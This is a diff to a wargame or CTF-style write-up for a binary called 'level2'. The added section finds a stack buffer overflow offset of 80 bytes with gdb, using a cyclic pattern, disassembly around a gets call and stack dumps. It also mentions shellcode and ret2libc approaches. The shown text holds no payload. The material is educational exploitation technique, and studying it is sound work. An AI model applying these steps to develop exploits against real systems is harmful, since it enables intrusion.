@@ -180,7 +180,95 @@ we either can inject shellcode in the hype
 or : inject shellcode in the stack but add a gadget address to bypass that check
 or : use the `ret2libc` exploit (call the system function with "/bin/sh") and also add a gadget address to bypass the check 
 
----
+lets find the offset where the program fall into the buffer overflow
+1- online [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
+- in gdb :
+    ```c
+    Starting program: /home/user/level2/level2 <<<  "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
+    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+    Program received signal SIGSEGV, Segmentation fault.
+    Error while running hook_stop:
+    No function contains program counter for selected frame.
+    0x37634136 in ?? () <=== offset : 80
+    (gdb) 
+
+    ```
+2- manually
+lets break point after the the gets call so we can see the stack after being filled with out input (`AAAABBBBCCCCDDDDEEEE`)
+ - in gdb :
+    ```c
+    (gdb) disass p
+    0x080484d4 <+0>:	push   ebp
+    0x080484d5 <+1>:	mov    ebp,esp
+    0x080484d7 <+3>:	sub    esp,0x68
+    0x080484da <+6>:	mov    eax,ds:0x8049860
+    0x080484df <+11>:	mov    DWORD PTR [esp],eax
+    0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+    0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
+    0x080484ea <+22>:	mov    DWORD PTR [esp],eax
+    0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+    0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4] <-------- here
+    (gdb) b * 0x080484f2
+    Breakpoint 4 at 0x80484f2
+    (gdb) run
+    Starting program: /home/user/level2/level2 
+    AAAABBBBCCCCDDDDEEEE
+    Dump of assembler code for function p:
+    0x080484d4 <+0>:	push   ebp
+    0x080484d5 <+1>:	mov    ebp,esp
+    0x080484d7 <+3>:	sub    esp,0x68
+    0x080484da <+6>:	mov    eax,ds:0x8049860
+    0x080484df <+11>:	mov    DWORD PTR [esp],eax
+    0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+    0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
+    0x080484ea <+22>:	mov    DWORD PTR [esp],eax
+    0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+    => 0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
+    0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
+        *
+        *
+        *
+    0x0804853d <+105>:	leave  
+    0x0804853e <+106>:	ret    
+    End of assembler dump.
+    ------------------------- [FRAME] -------------------------
+    Stack level 0, frame at 0xbffff720:
+    eip = 0x80484f2 in p; saved eip 0x804854a
+    called by frame at 0xbffff730
+    Arglist at 0xbffff718, args: 
+    Locals at 0xbffff718, Previous frame's sp is 0xbffff720
+    Saved registers:
+    ebp at 0xbffff718, eip at 0xbffff71c
+    -----------------------------------------------------------
+    (gdb) x 0xbffff71c
+    0xbffff71c:	0x0804854a
+
+    ```
+so our __EIP__ is at ___0xbffff71c___ (108 bytes from the ESP) containing : ___0x0804854a___ (which is main<+11> Leave instruction)
+- lets view our stack now
+[![stack view](./Ressources/level2-stack-overflow-anim.png)](./Ressources/level2-stack-overflow-anim.png)
+the start of the our buffer wher the user input is taken its at 0x41414141 (AAAA)
+and we notice our eip away from it with 80 bytes(4 * 4 * 5) 
+lets fill again the our buffer with `A` 80 times
+- LOOOOK AT THIS : 
+    ```
+    (gdb) x/30wx $esp
+    0xbffff6b0:	0xbffff6cc	0x00000000	0x00000000	0xb7e5ec73
+    0xbffff6c0:	0x080482b5	0xbffff7c4	0xbffff8ee	0x41414141
+    0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+    0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+    0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+    0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
+    0xbffff710:	0x41414141	0x41414141	0x41414141	0x08048500
+    0xbffff720:	0x08048550	0x00000000
+    (gdb) 
+    ```
+it stoped exactly at our EIP address,
+now we have a clear answer that the __offset of the buffer overflow is 80__
+
+
+---  
 ### Solution :
 
 ##### 1:- use the shellcode exploit in the Hype
